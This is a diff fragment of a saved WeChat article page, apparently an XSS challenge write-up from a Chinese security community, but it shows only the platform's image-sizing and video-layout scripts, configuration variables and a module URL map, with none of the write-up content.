+            w = parseFloat(style.paddingLeft) + parseFloat(style.paddingRight) + parseFloat(style.borderLeftWidth) + parseFloat(style.borderRightWidth);
+        }
+        return w;
+    };
+    var getOuterH =function(dom){
+        var style=getComputedStyle(dom),
+            h=0;
+        if(!!style){
+            h = parseFloat(style.paddingTop) + parseFloat(style.paddingBottom) + parseFloat(style.borderTopWidth) + parseFloat(style.borderBottomWidth);
+        }
+        return h;
+    };
+    var insertAfter = function(dom,afterDom){
+        var _p = afterDom.parentNode;
+        if(!_p){
+            return;
+        }
+        if(_p.lastChild === afterDom){
+            _p.appendChild(dom);
+        }else{
+            _p.insertBefore(dom,afterDom.nextSibling);
+        }
+    };
+    var getQuery = function(name,url){
+        
+        var u  = arguments[1] || window.location.search,
+            reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)"),
+            r = u.substr(u.indexOf("\?")+1).match(reg);
+        return r!=null?r[2]:"";
+    };
+
+    
+    function setImgSize(item, widthNum, widthUnit, ratio, breakParentWidth) {
+        setTimeout(function () {
+            var img_padding_border = getOuterW(item) || 0;
+            var img_padding_border_top_bottom = getOuterH(item) || 0;
+            
+            if (widthNum > getParentWidth(item) && !breakParentWidth) {
+                widthNum = getParentWidth(item);
+            }
+
+            height = (widthNum - img_padding_border) * ratio + img_padding_border_top_bottom;
+
+            if (isIE) {
+                var url = item.getAttribute('data-src');
+                item.src = url;
+            } else {
+                if(parseFloat(widthNum, 10) > 40 && height > 40 && breakParentWidth) {
+                    item.className += ' img_loading';
+                }
+                item.src = "data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==";
+            }
+            item.style.cssText += ";width: " + widthNum + widthUnit + " !important;";
+            item.style.cssText += ";height: " + height + widthUnit + " !important;";
+        }, 10);
+    }
+
+    (function(){
+        var images = document.getElementsByTagName('img');
+        var length = images.length;
+        var max_width = getMaxWith();
+        for (var i = 0; i < length; ++i) {
+            if (window.__second_open__ && images[i].getAttribute('__sec_open_place_holder__')) {
+                continue;
+            }
+            var imageItem = images[i];
+            var src_ = imageItem.getAttribute('data-src');
+            var realSrc = imageItem.getAttribute('src');
+            if (!src_ || realSrc) continue;
+            
+            var originWidth = imageItem.getAttribute('data-w');
+            var ratio_ = 1 * imageItem.getAttribute('data-ratio');
+
+            var height = 100;
+            if (ratio_ && ratio_ > 0) {
+                var parent_width = getParentWidth(imageItem) || max_width;
+                var initWidth = imageItem.style.width || imageItem.getAttribute('width') || originWidth || parent_width;
+                initWidth = parseFloat(initWidth, 10) > max_width ? max_width : initWidth;
+                
+                if (initWidth) {
+                    imageItem.setAttribute('_width', !isNaN(initWidth * 1) ? initWidth + 'px' : initWidth);
+                }
+                
+                if (typeof initWidth === 'string' && initWidth.indexOf('%') !== -1) {
+                    initWidth = parseFloat(initWidth.replace('%', ''), 10) / 100 * parent_width;
+                }
+                
+                if (initWidth === 'auto') {
+                    initWidth = originWidth;
+                }
+
+                var res = /^(\d+(?:\.\d+)?)([a-zA-Z%]+)?$/.exec(initWidth);
+                var widthNum = res && res.length >= 2 ? res[1] : 0;
+                var widthUnit = res && res.length >= 3 && res[2] ? res[2] : 'px';
+
+                
+                setImgSize(imageItem, widthNum, widthUnit, ratio_, true);
+                
+                (function (item, widthNumber, unit, ratio) {
+                    setTimeout(function () {
+                        setImgSize(item, widthNumber, unit, ratio, false);
+                    });
+                })(imageItem, widthNum, widthUnit, ratio_);
+            } else {
+                imageItem.style.cssText += ";visibility: hidden !important;";
+            }
+
+        }
+    })();
+    window.__videoDefaultRatio=16/9;
+    window.__getVideoWh = function(dom){
+        var max_width = getMaxWith(),
+            width = max_width,
+            ratio_ = dom.getAttribute('data-ratio')*1,
+            arr = [4/3, 16/9],
+            ret = arr[0],
+            abs = Math.abs(ret - ratio_);
+        if (!ratio_) { 
+            if (dom.getAttribute("data-mpvid")) { 
+                ratio_ = 16/9;
+            } else { 
+                ratio_ = 4/3;
+            }
+        } else { 
+            for (var j = 1, jl = arr.length; j < jl; j++) {
+                var _abs = Math.abs(arr[j] - ratio_);
+                if (_abs < abs) {
+                    abs = _abs;
+                    ret = arr[j];
+                }
+            }
+            ratio_ = ret;
+        }
+        
+        var parent_width = getParentWidth(dom)||max_width,
+            width = width > parent_width ? parent_width : width,
+            outerW = getOuterW(dom)||0,
+            outerH = getOuterH(dom)||0,
+            videoW = width - outerW,
+            videoH = videoW/ratio_,
+            height = videoH + outerH;
+        return {w:Math.ceil(width),h:Math.ceil(height),vh:videoH,vw:videoW,ratio:ratio_};
+    };
+
+
+    (function(){
+        var iframe = document.getElementsByTagName('iframe');
+        for (var i=0,il=iframe.length;i<il;i++) {
+            if (window.__second_open__ && iframe[i].getAttribute('__sec_open_place_holder__')) {
+                continue;
+            }
+            var a = iframe[i];
+            var src_ = a.getAttribute('src')||a.getAttribute('data-src')||"";
+            if(!/^http(s)*\:\/\/v\.qq\.com\/iframe\/(preview|player)\.html\?/.test(src_)
+                && !/^http(s)*\:\/\/mp\.weixin\.qq\.com\/mp\/readtemplate\?t=pages\/video_player_tmpl/.test(src_)
+            ){
+                continue;
+            }
+            var vid = getQuery("vid",src_);
+            if(!vid){
+                continue;
+            }
+            vid=vid.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"");
+            a.removeAttribute('src');
+            a.style.display = "none";
+            var obj = window.__getVideoWh(a),
+                videoPlaceHolderSpan = document.createElement('span'),
+                videoPlayerIconSpan = document.createElement('span'),
+                mydiv = document.createElement('img');
+
+            videoPlaceHolderSpan.className = "js_img_loading db";
+            videoPlaceHolderSpan.setAttribute("data-vid", vid);
+            
+
+            videoPlayerIconSpan.className = 'wx_video_context db'; 
+            videoPlayerIconSpan.style.display = 'none';
+            videoPlayerIconSpan.innerHTML = '<span class="wx_video_thumb_primary"></span><button class="wx_video_play_btn">播放</button><span class="wx_video_mask"></span>'; 
+
+            mydiv.className = "img_loading";
+
+            mydiv.src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==";
+            
+            
+            videoPlaceHolderSpan.style.cssText = "width: " + obj.w + "px !important;";
+            mydiv.style.cssText += ";width: " + obj.w + "px";
+            videoPlaceHolderSpan.appendChild(videoPlayerIconSpan);
+            videoPlaceHolderSpan.appendChild(mydiv);
+            insertAfter(videoPlaceHolderSpan, a); 
+            
+            a.style.cssText += ";width: " + obj.w + "px !important;";
+            a.setAttribute("width",obj.w);
+            if(window.__zoom!=1){
+                a.style.display = "block";
+                videoPlaceHolderSpan.style.display = "none";
+                a.setAttribute("_ratio",obj.ratio);
+                a.setAttribute("_vid",vid);
+            }else{
+                videoPlaceHolderSpan.style.cssText += "height: " + obj.h + "px !important;";
+                mydiv.style.cssText += "height: " + obj.h + "px !important;";
+                a.style.cssText += "height: " + obj.h + "px !important;";
+                a.setAttribute("height",obj.h);
+            }
+            a.setAttribute("data-vh",obj.vh);
+            a.setAttribute("data-vw",obj.vw);
+            if(a.getAttribute("data-mpvid")){
+                a.setAttribute("data-src",location.protocol+"//mp.weixin.qq.com/mp/readtemplate?t=pages/video_player_tmpl&auto=0&vid="+vid);
+            }else{
+                a.setAttribute("data-src",location.protocol+"//v.qq.com/iframe/player.html?vid="+ vid + "&width="+obj.vw+"&height="+obj.vh+"&auto=0");   
+            }            
+        }
+    })();
+    
+    (function(){
+        if(window.__zoom!=1){
+            if (!window.__second_open__) {
+                document.getElementById('page-content').style.zoom = window.__zoom;
+                var a = document.getElementById('activity-name');
+                var b = document.getElementById('meta_content');
+                if(!!a){
+                    a.style.zoom = 1/window.__zoom;
+                }
+                if(!!b){
+                    b.style.zoom = 1/window.__zoom;
+                }
+            }
+            var images = document.getElementsByTagName('img');
+            for (var i = 0,il=images.length;i<il;i++) {
+                if (window.__second_open__ && images[i].getAttribute('__sec_open_place_holder__')) {
+                    continue;
+                }
+                images[i].style.zoom = 1/window.__zoom;
+            }
+            var iframe = document.getElementsByTagName('iframe');
+            for (var i = 0,il=iframe.length;i<il;i++) {
+                if (window.__second_open__ && iframe[i].getAttribute('__sec_open_place_holder__')) {
+                    continue;
+                }
+                var a = iframe[i];
+                a.style.zoom = 1/window.__zoom;
+                var src_ = a.getAttribute('data-src')||"";
+                if(!/http(s)*\:\/\/v\.qq\.com\/iframe\/(preview|player)\.html\?/.test(src_)){
+                    continue;
+                }
+                var ratio = a.getAttribute("_ratio");
+                var vid = a.getAttribute("_vid");
+                a.removeAttribute("_ratio");
+                a.removeAttribute("_vid");
+                var vw = a.offsetWidth - (getOuterW(a)||0);
+                var vh = vw/ratio;
+                var h = vh + (getOuterH(a)||0)
+                a.style.cssText += "height: " + h + "px !important;"
+                a.setAttribute("height",h);
+                a.setAttribute("data-src",location.protocol+"//v.qq.com/iframe/player.html?vid="+ vid + "&width="+vw+"&height="+vh+"&auto=0");
+                a.style.display = "none";
+                var parent = a.parentNode;
+                if(!parent){
+                    continue;
+                }
+                for(var j=0,jl=parent.children.length;j<jl;j++){
+                    var child = parent.children[j];
+                    if(child.className.indexOf("img_loading")>=0 && child.getAttribute("data-vid")==vid){
+                        child.style.cssText += "height: " + h + "px !important;";
+                        child.style.display = "";
+                    }
+                }
+            }
+        }
+    })();
+})();
+</script>
+<script nonce="2043559309" type="text/javascript">
+    var new_appmsg = 1;
+    var item_show_type = "0";
+    var can_see_complaint = "0";
+    var not_in_mm_css = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/page/appmsg_new/not_in_mm435ee6.css";
+    var windowwx_css = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/page/appmsg_new/winwx435ee6.css";
+    var article_improve_combo_css = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/page/appmsg_new/combo438c19.css";
+    var tid = "";
+    var aid = "";
+    var clientversion = "";
+    var appuin = ""||"MzI5MzY2MzM0Mw==";
+
+    var source = "";
+    var ascene = "";
+    var subscene = "";
+    var sessionid = ""||"";
+    var abtest_cookie = "";
+
+    var scene = 75;
+
+    var itemidx = "";
+    var appmsg_token   = "";
+    var _copyright_stat = "1";
+    var _ori_article_type = "科技互联网";
+
+    var is_follow = "";
+    var nickname = "先知安全技术社区";
+    var appmsg_type = "9";
+    var ct = "1504100903";
+    var publish_time = "2017-08-30" || "";
+    var user_name = "gh_12f3517e40de";
+    var user_name_new = "";
+    var fakeid   = "";
+    var version   = "";
+    var is_limit_user   = "0";
+    var round_head_img = "http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpm6QA8H1s8GUUBtJ8XKpwGMfBA5LKbEicWLylaibj6wP2Fv6AwVJ9wQo1DmZq9NH00n6FtqBV2gqow/0?wx_fmt=png";
+    var hd_head_img = "http://wx.qlogo.cn/mmhead/Q3auHgzwzM6lMm6RibrkojOiaO9bZzL9FNrcEgkOXlaJDLia9FB8KwwDQ/0"||"";
+    var ori_head_img_url = "http://wx.qlogo.cn/mmhead/Q3auHgzwzM6lMm6RibrkojOiaO9bZzL9FNrcEgkOXlaJDLia9FB8KwwDQ/132";
+    var msg_title = "先知XSS挑战赛 - L3m0n Writeup";
+    var msg_desc = "期待我们的下一次";
+    var msg_cdn_url = "http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iaHjPbs7ibX5YPh4Nu34BOIibeN69vTVwibmaLPKA9khGVEnV2tiaFfWClug/0?wx_fmt=jpeg"; 
+    var cdn_url_1_1  = ""; 
+    var cdn_url_235_1 = ""; 
+    
+    var msg_link = "http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484070&amp;idx=1&amp;sn=673e20a08d9ae6c3de60ca48110b920a&amp;chksm=ec6fe5a6db186cb0a6a85317637c15628b886151bc0b808cc9586098b8a496fb76bbc54f10a5#rd"; 
+    var user_uin = "0"*1;
+    var msg_source_url = 'https://xianzhi.aliyun.com/forum/read/2044.html';
+    var img_format = 'jpeg';
+    var srcid = '';
+    var req_id = '1014ghql0m1ZZ2faLsC1cEQC';
+    var networkType;
+    var appmsgid = '' || ''|| "2247484070";
+    var comment_id = "462205485" || "462205485" * 1;
+    var comment_enabled = "" * 1;
+    var is_need_reward = "0" * 1;
+    var is_https_res = ("" * 1) && (location.protocol == "https:");
+    var msg_daily_idx = "1" || "";
+    var profileReportInfo = "" || "";
+
+    var devicetype = "";
+    var source_encode_biz = "";
+    var source_username = "";
+    
+    var reprint_ticket = "";
+    var source_mid = "";
+    var source_idx = "";
+    var source_biz = "";
+    var author_id = "";
+
+    
+    var optimizing_flag = "0" * 1;
+    var ad_abtest_padding = "0" * 1;
+
+    var show_comment = "";
+    var __appmsgCgiData = {
+        wxa_product : ""*1,
+        wxa_cps : ""*1,
+        show_msg_voice: "0"*1,
+        can_use_page : "0"*1,
+        is_wxg_stuff_uin : "0"*1,
+        card_pos : "",
+        copyright_stat : "1",
+        source_biz : "",
+        hd_head_img : "http://wx.qlogo.cn/mmhead/Q3auHgzwzM6lMm6RibrkojOiaO9bZzL9FNrcEgkOXlaJDLia9FB8KwwDQ/0"||(window.location.protocol+"//"+window.location.host + "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_rumor_link.2x42f400.jpg")
+    };
+    var _empty_v = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/pages/voice/empty42f400.mp3";
+
+    var copyright_stat = "1" * 1;
+
+    var pay_fee = "" * 1;
+    var pay_timestamp = "";
+    var need_pay = "" * 1;
+
+    var need_report_cost = "0" * 1;
+    var use_tx_video_player = "0" * 1;
+    var appmsg_fe_filter = "contenteditable";
+
+    var friend_read_source = "" || "";
+    var friend_read_version = "" || "";
+    var friend_read_class_id = "" || "";
+
+    var is_only_read = "1" * 1;
+    var read_num = "" * 1;
+    var like_num = "" * 1;
+    var liked = "" == 'true' ? true : false;
+    var is_temp_url = "" ? 1 : 0;
+    var send_time = "";
+    var icon_emotion_switch = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/appmsg/emotion/icon_emotion_switch.2x42f400.png";
+    var icon_emotion_switch_active = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/appmsg/emotion/icon_emotion_switch_active.2x42f400.png";
+    var icon_loading_white = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/common/icon_loading_white42f400.gif";
+    var icon_audio_unread = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/appmsg/audio/icon_audio_unread42f400.png";
+    var icon_qqmusic_default = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/appmsg/qqmusic/icon_qqmusic_default.2x42f400.png";
+    var icon_qqmusic_source = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/appmsg/qqmusic/icon_qqmusic_source42f400.png";
+    var icon_kugou_source = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/appmsg/kugou/icon_kugou_source42f400.png";
+
+    var topic_default_img = '//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/appmsg/topic/pic_book_thumb.2x42f400.png';
+    var comment_edit_icon = '//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/appmsg_new/icon_edit42f400.png';
+    var comment_loading_img = '//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/common/icon_loading_white42f400.gif';
+
+    var voice_in_appmsg = {
+        "1":"1"
+            };
+
+    var reprint_style = ''*1;
+    var wxa_img_alert = "" != 'false';
+
+    
+    var more_read_type = '0'*1;
+
+    
+    
+    
+    
+
+    
+    var weapp_sn_arr_json = "" || "";
+
+    
+    var ban_scene = "0" * 1;
+
+    var svr_time = "1549780403" * 1;
+    
+    var is_transfer_msg = ""*1||0;
+
+    var malicious_title_reason_id = "0" * 1; 
+    var malicious_content_type = "0" * 1; 
+
+    
+    var modify_time = "";
+
+    
+    var isprofileblock = "0";
+
+    
+    var hotspotInfoList = [
+                    ];
+
+        window.wxtoken = "777";
+        
+    
+    
+    
+    
+    window.is_login = '0' * 1; 
+
+    window.__moon_initcallback = function(){
+        if(!!window.__initCatch){
+            window.__initCatch({
+                idkey : 27611+2,
+                startKey : 0,
+                limit : 128,
+                badjsId: 43,
+                reportOpt : {
+                    uin : uin,
+                    biz : biz,
+                    mid : mid,
+                    idx : idx,
+                    sn  : sn
+                },
+                extInfo : {
+                    network_rate : 0.01,    
+                    badjs_rate: 0.1 
+                }
+            });
+        }
+    }
+        
+    var title ="先知安全技术社区";
+
+    var is_new_msg=true;
+    
+    
+
+    var is_wash = '' * 1;
+</script>
+
+<script nonce="2043559309" type="text/javascript">
+(function(_g){
+    _g.appmsg_like_type = "1" * 1 ? "1" * 1 : 1;
+    
+    _g.clientversion = "";
+    _g.passparam = ""; 
+    if(!_g.msg_link) {
+      _g.msg_link = "http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484070&amp;idx=1&amp;sn=673e20a08d9ae6c3de60ca48110b920a&amp;chksm=ec6fe5a6db186cb0a6a85317637c15628b886151bc0b808cc9586098b8a496fb76bbc54f10a5#rd";
+    }
+    _g.appmsg_type = "9"; 
+    _g.devicetype = ""; 
+})(window);
+
+</script>
+
+
+        <script nonce="2043559309">window.__moon_host = 'res.wx.qq.com';window.__moon_mainjs = 'appmsg/index.js';window.moon_map = {"a/appdialog_confirm.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/appdialog_confirm.html42f400.js","widget/wx_profile_dialog_primary.css":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/widget/wx_profile_dialog_primary.css42f400.js","pages/iframe_communicate.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/iframe_communicate42f400.js","new_video/player.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/new_video/player.html433882.js","biz_wap/zepto/touch.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/zepto/touch42f400.js","biz_wap/zepto/event.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/zepto/event42f400.js","biz_wap/zepto/zepto.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/zepto/zepto42f400.js","page/pages/video.css":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/page/pages/video.css435ee6.js","a/tpl/smallbanner_msg_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/smallbanner_msg_tpl.html42f400.js","a/tpl/smallbanner_info_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/smallbanner_info_tpl.html42f400.js","a/tpl/banner_info_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/banner_info_tpl.html42f400.js","a/tpl/promote_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/promote_tpl.html42f400.js","a/tpl/smallcard_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/smallcard_tpl.html42f400.js","a/tpl/info_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/info_tpl.html42f400.js","a/tpl/cardticket_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/cardticket_tpl.html42f400.js","a/tpl/banner_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/banner_tpl.html42f400.js","a/tpl/sponsor_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/sponsor_tpl.html42f400.js","a/tpl/new_cpc_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/new_cpc_tpl.html42f400.js","appmsg/emotion/caret.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/emotion/caret42f400.js","biz_wap/utils/localstorage.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/localstorage42f400.js","appmsg/friend_comment_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/friend_comment_tpl.html42f400.js","appmsg/comment_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/comment_tpl.html42f400.js","biz_wap/utils/fakehash.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/fakehash42f400.js","appmsg/comment_report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/comment_report42f400.js","a/appdialog_confirm.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/appdialog_confirm42f400.js","new_video/player.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/new_video/player4306fd.js","a/tpl/mpda_bottom_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/mpda_bottom_tpl.html42f400.js","a/tpl/crt_size_map.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/crt_size_map42f400.js","biz_wap/jsapi/cardticket.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/jsapi/cardticket42f400.js","biz_common/jquery.md5.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/jquery.md542f400.js","biz_common/utils/emoji_panel_data.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/emoji_panel_data42f400.js","biz_common/utils/emoji_data.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/emoji_data42f400.js","appmsg/emotion/textarea.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/emotion/textarea42f400.js","appmsg/emotion/nav.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/emotion/nav42f400.js","appmsg/emotion/common.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/emotion/common42f400.js","appmsg/emotion/slide.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/emotion/slide42f400.js","appmsg/emotion/dom.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/emotion/dom42f400.js","pages/music_report_conf.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/music_report_conf42f400.js","pages/report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/report4306fd.js","pages/player_adaptor.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/player_adaptor42f400.js","pages/music_player.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/music_player42f400.js","appmsg/more_read_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/more_read_tpl.html42f400.js","appmsg/retry_ajax.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/retry_ajax42f400.js","complain/tips.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/complain/tips42f400.js","pages/loadscript.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/loadscript42f400.js","biz_wap/utils/ajax_load_js.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/ajax_load_js42f400.js","appmsg/comment.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/comment4317dc.js","a/ios.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/ios42f400.js","a/android.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/android42f400.js","a/profile.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/profile42f400.js","a/app_card.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/app_card430506.js","a/sponsor.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/sponsor42f400.js","a/tpl/cpc_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/cpc_tpl.html42f400.js","a/video.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/video42f400.js","a/a_config.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/a_config42f400.js","a/tpl/crt_tpl_manager.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/tpl/crt_tpl_manager42f400.js","a/cpc_a_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/cpc_a_tpl.html42f400.js","a/sponsor_a_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/sponsor_a_tpl.html42f400.js","a/a_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/a_tpl.html42f400.js","a/mpshop.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/mpshop42f400.js","a/wxopen_card.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/wxopen_card42f400.js","a/card.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/card42f400.js","biz_wap/utils/position.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/position42f400.js","a/a_report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/a_report42f400.js","biz_wap/utils/show_time.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/show_time42f400.js","biz_common/utils/get_para_list.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/get_para_list42f400.js","biz_wap/utils/openUrl.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/openUrl42f400.js","a/a_sign.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/a/a_sign438181.js","appmsg/my_comment_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/my_comment_tpl.html42f400.js","appmsg/cmt_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/cmt_tpl.html42f400.js","sougou/a_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/sougou/a_tpl.html42f400.js","appmsg/emotion/emotion.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/emotion/emotion42f400.js","biz_common/base64.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/base6442f400.js","biz_common/utils/report.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/report42f400.js","appmsg/articleReport.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/articleReport42f400.js","biz_wap/utils/hand_up_state.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/hand_up_state42f400.js","biz_common/utils/http.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/http42f400.js","biz_common/utils/cookie.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/cookie42f400.js","appmsg/topic_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/topic_tpl.html42f400.js","pages/weapp_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/weapp_tpl.html42f400.js","biz_common/utils/monitor.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_common/utils/monitor42f400.js","pages/voice_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/voice_tpl.html42f400.js","pages/kugoumusic_ctrl.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/kugoumusic_ctrl42f400.js","pages/qqmusic_ctrl.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/qqmusic_ctrl42f400.js","pages/voice_component.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/voice_component42f400.js","pages/qqmusic_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/qqmusic_tpl.html42f400.js","new_video/ctl.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/new_video/ctl4306fd.js","appmsg/open_url_with_webview.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/open_url_with_webview4380a9.js","appmsg/more_read.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/more_read42f400.js","appmsg/reward_entry.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/reward_entry42f400.js","appmsg/like.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/like43875f.js","pages/version4video.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/version4video42f400.js","biz_wap/utils/storage.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/utils/storage42f400.js","appmsg/share_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/share_tpl.html42f400.js","appmsg/appmsgext.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/appmsgext430b95.js","appmsg/img_copyright_tpl.html.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/appmsg/img_copyright_tpl.html42f400.js","pages/video_ctrl.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/video_ctrl42f400.js","pages/create_txv.js":"//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/pages/create_txv42f400.js","appmsg/comment_utils.js":"//res.wx.qq.com/m